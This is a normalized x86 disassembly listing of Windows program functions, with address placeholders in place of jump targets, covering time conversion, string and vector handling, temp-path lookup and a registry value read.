xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
je r-xdata
lea eax [ esp + 0xc ]
mov edi ebx
mov [ esp + 0xc ] 0x1
call sub_427930
mov edx [ ebp + 0x10 ]
cmp [ esp + 0xc ] 0x0
mov [ edx ] eax
jmp r-xdata
sub_427cb0
fldz
sub esp 0x8
fcomp [ ecx ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ r--data ]
fld [ r--data ]
jmp r-xdata
fadd [ ecx ]
fmul [ r--data ]
call sub_4567d6
mov [ esp ] eax
mov [ esp + 0x4 ] edx
fild [ esp ]
add esp 0x8
retn
sub_427cf0
sub esp 0x10
fld [ eax ]
fst [ esp ]
fldz
fcomp st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov ecx [ esp + 0x14 ]
fstp [ esp ]
fld [ ecx ]
fst [ esp + 0x8 ]
fldz
fcomp st1
fnstsw ax
test ah 0x41
jpo r-xdata
sub esp 0x8
fstp [ esp ]
call sub_440fe0
fld [ esp + 0x8 ]
add esp 0x8
fsub st1
fsubp st1
fsubr [ esp ]
mov [ esi + 0x8 ] 0x0
fst [ esi ]
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
sub esp 0x8
fstp [ esp ]
call sub_440fe0
fld [ esp + 0x10 ]
add esp 0x8
fsub st1
fsubp st1
fstp st0
mov [ esi + 0x8 ] 0x1
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
mov eax esi
add esp 0x10
retn 0x4
mov [ esi + 0x8 ] 0x1
mov eax esi
add esp 0x10
retn 0x4
sub_427d90
sub esp 0x24
push eax
lea ecx [ esp + 0x4 ]
push ecx
call sub_440d20
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
movzx ecx [ esp + 0x18 ]
add edx 0x76c
inc eax
mov [ esi ] dx
movzx edx [ esp + 0xc ]
mov [ esi + 0x2 ] ax
mov ax [ esp + 0x8 ]
mov [ esi + 0x4 ] cx
movzx ecx [ esp + 0x4 ]
mov [ esi + 0x6 ] dx
movzx edx [ esp ]
mov [ esi + 0x8 ] ax
xor eax eax
mov [ esi + 0xe ] ax
mov [ esi + 0xa ] cx
mov [ esi + 0xc ] dx
mov al 0x1
add esp 0x24
retn
xor al al
add esp 0x24
retn
sub_427e20
sub esp 0x14
test edi edi
jne r-xdata
push edi
push esi
call [ SystemTimeToVariantTime@IAT ]
xor ecx ecx
mov [ esp ] ecx
mov [ esp + 0x4 ] ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0xc ] ecx
test eax eax
je r-xdata
push 0x80004005
call sub_427e00
xor eax eax
add esp 0x14
retn
fld [ edi ]
lea eax [ esp ]
push eax
sub esp 0x8
fstp [ esp ]
call [ VariantTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov cx [ esi ]
cmp cx [ esp ]
jne r-xdata
mov dx [ esi + 0x2 ]
cmp dx [ esp + 0x2 ]
jne r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ esp + 0x6 ]
jne r-xdata
mov cx [ esi + 0x8 ]
cmp cx [ esp + 0x8 ]
jne r-xdata
mov dx [ esi + 0xa ]
cmp dx [ esp + 0xa ]
jne r-xdata
mov ax [ esi + 0xc ]
cmp ax [ esp + 0xc ]
jne r-xdata
mov eax 0x1
add esp 0x14
retn
sub_427ec0
sub esp 0x1c
fldz
mov ecx [ esp + 0x24 ]
push esi
push edi
mov edi eax
mov eax [ esp + 0x28 ]
fstp [ edi ]
mov [ esp + 0x8 ] eax
lea esi [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
mov [ edi + 0x8 ] 0x0
mov [ esp + 0xc ] ecx
call sub_427d90
test al al
je r-xdata
mov eax 0x1
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop esi
add esp 0x1c
retn 0x8
call sub_427e20
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop esi
add esp 0x1c
retn 0x8
sub_427f20
push ebp
mov ebp esp
push 0xffffffff
push sub_45a1d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov ecx esi
call sub_427fe0
add esp 0x4
dec edi
add esi 0x1c
mov [ ebp + 0x8 ] esi
jmp r-xdata
test edi edi
jbe r-xdata
sub_427f78
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_442eab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_429950
add esi 0x1c
cmp esi edi
jne r-xdata
sub_427fb0
push ecx
mov ecx [ esp + 0x8 ]
mov [ esp ] 0x0
mov eax [ esp ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push edi
mov edx esi
call sub_427f20
lea edx [ esi * 8 ]
sub edx esi
lea eax [ edi + edx * 4 ]
add esp 0x10
retn 0x4
sub_427fe0
push 0xffffffff
push sub_459e35
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x1c ]
mov esi ecx
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
mov ecx eax
lea edi [ ecx + 0x2 ]
jmp r-xdata
sub ecx edi
sar ecx 0x1
push ecx
call sub_429cc0
sub_428070
push ebp
mov ebp esp
push 0xffffffff
push sub_45a530
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov esi edx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov ecx edi
call sub_427fe0
add edi 0x1c
add esp 0x4
mov [ ebp + 0x8 ] edi
add esi 0x1c
jmp r-xdata
cmp esi ebx
je r-xdata
sub_4280ca
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_442eab
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_429950
add esi 0x1c
cmp esi edi
jne r-xdata
sub_428130
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov esi eax
cmp ebp edi
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx ebx
sar ecx 0x1
push ecx
call sub_429cc0
cmp edi ebp
jne r-xdata
mov ecx eax
lea ebx [ ecx + 0x2 ]
lea esp [ esp ]
sub edi 0x1c
sub esi 0x1c
cmp [ edi + 0x18 ] 0x8
jb r-xdata
mov eax esi
pop ebx
sub_428180
sub esp 0x8
push esi
mov esi eax
xor al al
mov [ esp + 0x8 ] al
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
mov [ esp + 0x4 ] al
mov eax [ esp + 0x4 ]
push eax
push ecx
push edx
push ebx
mov eax edi
mov ecx esi
call sub_428130
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax * 8 ]
sub ecx eax
add ecx ecx
add esp 0x10
add ecx ecx
mov eax edi
sub eax ecx
pop esi
add esp 0x8
retn
sub_4281e0
push esi
mov esi eax
cmp esi ebx
je r-xdata
pop esi
retn
push ebp
mov ebp [ esp + 0xc ]
push edi
add ebp 0x4
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
call sub_429cc0
add esi 0x1c
cmp esi ebx
jne r-xdata
mov ecx eax
lea edi [ ecx + 0x2 ]
mov eax [ esp + 0x10 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
pop edi
pop ebp
sub_428230
push ebp
mov ebp esp
push 0xffffffff
push sub_45ace0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x50 ] ebx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
inc eax
cmp esi eax
jae r-xdata
call sub_411eb0
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0x9249249
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
mov eax [ ebp - 0x5c ]
jae r-xdata
mov ecx esi
shr ecx 0x1
mov edx 0x9249249
sub edx ecx
cmp edx esi
jae r-xdata
lea ecx [ ebp - 0x4c ]
call sub_428a10
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0x1c ]
push esi
mov edx edi
call sub_428100
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_428180
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
lea ebx [ eax + 0x1c ]
call sub_4281e0
lea esi [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
call sub_428a10
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0x1c ]
push eax
call sub_428100
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x30 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_427fb0
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0x1c
mov ebx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x30 ]
push ecx
add ebx 0xffffffe4
call sub_4281e0
lea esi [ ebp - 0x30 ]
jmp r-xdata
add esi ecx
xor esi esi
jmp r-xdata
add esp 0x4
call sub_429950
test esi esi
ja r-xdata
mov esi eax
cmp esi eax
jae r-xdata
mov ecx esi
call sub_429880
push 0x0
call sub_43fa1d
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x54 ]
lea ecx [ esi * 8 ]
sub ecx esi
lea ecx [ eax + ecx * 4 ]
mov [ ebx + 0x14 ] ecx
lea ecx [ edx * 8 ]
sub ecx edx
lea edx [ eax + ecx * 4 ]
mov [ ebx + 0x10 ] edx
mov [ ebx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ebx + 0xc ]
push ecx
call sub_429630
mov edx [ ebx + 0xc ]
add esp 0x4
push edx
call sub_43f960
mov edx [ ebp - 0x50 ]
add esp 0x4
mov ecx [ ebp + 0x10 ]
sub ecx [ ebx + 0xc ]
mov [ ebp - 0x54 ] eax
mov eax 0x92492493
imul ecx
add edx ecx
mov ecx [ ebp - 0x54 ]
sar edx 0x4
mov edi edx
xor eax eax
mov [ ebp - 0x4 ] eax
shr edi 0x1f
add edi edx
mov [ ebp - 0x58 ] eax
lea eax [ edi * 8 ]
sub eax edi
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push edx
push ecx
mov ecx [ ebp - 0x5c ]
push eax
mov edx 0x1
mov [ ebp - 0x60 ] edi
call sub_427f20
mov edx [ ebx + 0xc ]
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x54 ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] 0x1
call sub_428070
mov eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x10 ]
inc edi
lea edx [ edi * 8 ]
sub edx edi
lea eax [ eax + edx * 4 ]
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] 0x2
call sub_428070
mov edi [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add esp 0xc
cmp [ ebx + 0xc ] 0x0
lea edx [ edx + eax + 0x1 ]
mov [ ebp - 0x50 ] edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_42840c
cmp [ ebp - 0x58 ] 0x1
mov esi [ ebp - 0x60 ]
mov ebx [ ebp - 0x54 ]
jle r-xdata
cmp [ ebp - 0x58 ] 0x0
jle r-xdata
mov eax [ ebp - 0x50 ]
lea ecx [ esi * 8 ]
sub ecx esi
push eax
lea edi [ ebx + ecx * 4 ]
mov eax ebx
call sub_429630
add esp 0x4
push ebx
call sub_43f960
add esp 0x4
push 0x0
push 0x0
call sub_442eab
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
mov eax [ ebp - 0x5c ]
jae r-xdata
mov edx [ ebp - 0x50 ]
lea eax [ esi + 0x1 ]
push edx
lea ecx [ eax * 8 ]
sub ecx eax
lea edx [ esi * 8 ]
sub edx esi
lea edi [ ebx + ecx * 4 ]
lea eax [ ebx + edx * 4 ]
call sub_429630
add esp 0x4
lea ecx [ ebp - 0x4c ]
call sub_428a10
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0x1c ]
push esi
mov edx edi
call sub_428100
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_428180
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
lea ebx [ eax + 0x1c ]
call sub_4281e0
lea esi [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
call sub_428a10
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0x1c ]
push eax
call sub_428100
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x30 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_427fb0
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0x1c
mov ebx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x30 ]
push ecx
add ebx 0xffffffe4
call sub_4281e0
lea esi [ ebp - 0x30 ]
jmp r-xdata
add esp 0x4
call sub_429950
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_428590
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp edi ebx
jbe r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
mov ecx esi
call sub_428230
mov ebx [ esi + 0xc ]
cmp ebx [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] ebx
test esi esi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x2c ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
xor eax eax
lea ecx [ edi * 8 ]
sub ecx edi
lea edi [ ebx + ecx * 4 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_4407b7
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_428670
sub esp 0xc
push ebp
mov ebp [ ebx + 0xc ]
push esi
push edi
test ebp ebp
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
cmp ebp edi
jbe r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push edi
mov edx 0x1
call sub_427f20
add esp 0xc
add edi 0x1c
mov [ ebx + 0x10 ] edi
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax esi
jae r-xdata
mov eax [ ebx ]
push edi
push eax
mov eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
mov eax ebx
call sub_428590
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
call sub_4407b7
sub_428710
push ebp
push esi
mov esi [ eax ]
push edi
mov edi [ eax + 0x4 ]
cmp esi 0xfffffffc
je r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edi + edx * 2 ]
pop edi
mov [ ebx ] esi
pop esi
mov [ ebx + 0x4 ] eax
mov eax ebx
pop ebp
retn 0x4
test esi esi
jne r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
call sub_4407b7
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
call sub_4407b7
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov edx [ esp + 0x10 ]
mov ebp [ esi + 0x14 ]
lea edx [ edi + edx * 2 ]
lea ecx [ ecx + ebp * 2 ]
cmp edx ecx
ja r-xdata
cmp edx eax
jae r-xdata
mov eax [ eax ]
sub_428770
sub esp 0x1c
push ebx
mov ebx eax
mov ecx [ ebx + 0x18 ]
push ebp
push esi
push edi
lea esi [ ebx + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ esp + 0x14 ] esi
mov edx esi
mov edx [ esi ]
mov [ esp + 0x14 ] edx
jmp r-xdata
call sub_4407b7
cmp ecx 0x8
jb r-xdata
test edx edx
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
cmp edx 0x8
jb r-xdata
mov eax [ ebx + 0x14 ]
add eax eax
lea ebp [ eax + ecx ]
test ebp ebp
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp eax edx
ja r-xdata
mov edi esi
mov edi [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call sub_4407b7
cmp ecx 0x8
jb r-xdata
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebp
ja r-xdata
mov edx [ ebx + 0x18 ]
cmp edx 0x8
jb r-xdata
mov ecx [ ebx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp edx eax
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov edx [ esp + 0x14 ]
sub edx edi
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov [ edx + eax ] cx
add eax 0x2
cmp eax ebp
jne r-xdata
add ecx 0x20
cmp ecx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
add eax ecx
cmp ebp eax
jbe r-xdata
movzx ecx [ eax ]
lea esi [ ecx - 0x41 ]
cmp si 0x19
ja r-xdata
mov ecx [ ebx + 0x14 ]
lea edx [ esi + ecx * 2 ]
cmp edi edx
jbe r-xdata
mov esi [ esi ]
mov eax [ esp + 0x14 ]
mov ecx ebp
sub ecx edi
sar ecx 0x1
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] eax
push ecx
lea ebx [ esp + 0x24 ]
lea eax [ esp + 0x1c ]
call sub_428710
mov eax edi
cmp edi ebp
je r-xdata
sub_428890
push 0xffffffff
push sub_459b38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
xor eax eax
xor ebx ebx
push 0xffffffff
mov [ esp + 0x18 ] ax
mov eax [ esp + 0x40 ]
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
call sub_429a10
mov ecx [ esp + 0x40 ]
push ebx
push ecx
or eax 0xffffffff
lea esi [ esp + 0x18 ]
mov [ esp + 0x3c ] ebx
call sub_4290b0
push 0xffffffff
xor edx edx
mov [ edi + 0x18 ] 0x7
mov [ edi + 0x14 ] ebx
push ebx
mov ecx edi
mov [ edi + 0x4 ] dx
call sub_429a10
cmp [ esp + 0x28 ] 0x8
jb r-xdata
mov eax edi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x14 ]
push eax
call sub_43f960
add esp 0x4
sub_428970
sub esp 0x20c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x208 ] eax
push esi
xor eax eax
push 0x206
mov esi ecx
push eax
lea ecx [ esp + 0xe ]
push ecx
mov [ esp + 0x10 ] ax
call sub_443360
add esp 0xc
lea edx [ esp + 0x4 ]
push edx
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x4 ]
lea edx [ eax + 0x2 ]
xor al al
pop esi
mov ecx [ esp + 0x208 ]
xor ecx esp
call sub_43f96b
add esp 0x20c
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x8 ]
call sub_429cc0
mov ecx [ esp + 0x20c ]
pop esi
xor ecx esp
mov al 0x1
call sub_43f96b
add esp 0x20c
retn
sub_428a10
cmp [ eax + 0x18 ] 0x8
push esi
push edi
mov esi ecx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
mov ecx eax
lea edi [ ecx + 0x2 ]
jmp r-xdata
sub ecx edi
sar ecx 0x1
push ecx
call sub_429cc0
pop edi
mov eax esi
pop esi
retn
sub_428a60
push esi
mov esi ecx
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
mov ecx eax
push edi
lea edi [ ecx + 0x2 ]
lea ecx [ ecx ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
call sub_429cc0
pop edi
mov eax esi
pop esi
retn
sub_428ab0
sub esp 0x40c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x408 ] eax
push esi
push edi
lea eax [ esp + 0x8 ]
push eax
push 0x20019
xor edi edi
push edi
push r--data
push 0x80000002
mov esi ecx
mov [ esp + 0x1c ] edi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push 0x3ff
lea ecx [ esp + 0x15 ]
push 0x0
push ecx
mov [ esp + 0x18 ] 0x400
mov [ esp + 0x1c ] 0x0
call sub_443360
mov ecx [ esp + 0x14 ]
add esp 0xc
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x0
push r--data
push ecx
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
lea eax [ esp + 0x10 ]
lea edx [ eax + 0x2 ]
mov edi 0xfffffffe
jmp r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x14 ]
call sub_429cc0
mov ecx [ esp + 0x410 ]
mov eax edi
pop edi
pop esi
xor ecx esp
call sub_43f96b
add esp 0x40c
retn
push eax
call [ RegCloseKey@IAT ]
sub_428b90
sub esp 0x210
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20c ] eax
push esi
xor eax eax
push 0x206
mov esi ecx
push eax
lea ecx [ esp + 0x12 ]
push ecx
mov [ esp + 0x14 ] ax
call sub_443360
add esp 0xc
push 0x104
lea edx [ esp + 0xc ]
push edx
push 0x0
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x2 ]
xor al al
pop esi
mov ecx [ esp + 0x20c ]
xor ecx esp
call sub_43f96b
add esp 0x210
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push ebx
sub eax edx
sar eax 0x1
push edi
push eax
lea eax [ esp + 0x14 ]
call sub_429cc0
lea edi [ esp + 0xc ]
mov ebx esi
mov [ esp + 0xc ] 0x5c
call sub_428cb0
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
or eax 0xffffffff
call sub_429980
push 0x1
mov eax r--data
mov ecx esi
call sub_429170
mov ecx [ esp + 0x218 ]
pop edi
pop ebx
pop esi
xor ecx esp
mov al 0x1
call sub_43f96b
add esp 0x210
retn
pop edi
pop ebx
xor al al
pop esi
mov ecx [ esp + 0x20c ]
xor ecx esp
call sub_43f96b
add esp 0x210
retn
sub_428c80
push ecx
xor eax eax
mov [ esi + 0x14 ] eax
push ecx
mov [ esi + 0x18 ] 0x7
mov [ esp + 0x4 ] eax
mov [ esi + 0x4 ] ax
mov eax [ esp + 0xc ]
push edx
mov ecx esi
call sub_429a10
mov eax esi
pop ecx
retn 0x4
sub_428cb0
mov eax [ ebx + 0x14 ]
sub esp 0xc
push ebp
push esi
cmp eax 0x1
jb r-xdata
pop esi
or eax 0xffffffff
pop ebp
add esp 0xc
retn
dec eax
cmp eax 0xffffffff
jbe r-xdata
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
lea esi [ eax + ecx * 2 ]
mov eax [ eax ]
mov eax [ ebx + 0x18 ]
mov [ esp + 0xc ] eax
cmp eax 0x8
lea eax [ ebx + 0x4 ]
mov [ esp + 0x8 ] eax
jb r-xdata
mov eax ebx
call sub_428aa0
cmp esi eax
je r-xdata
mov edx 0x1
mov ecx edi
mov eax esi
sub esi 0x2
jmp r-xdata
mov ax bp
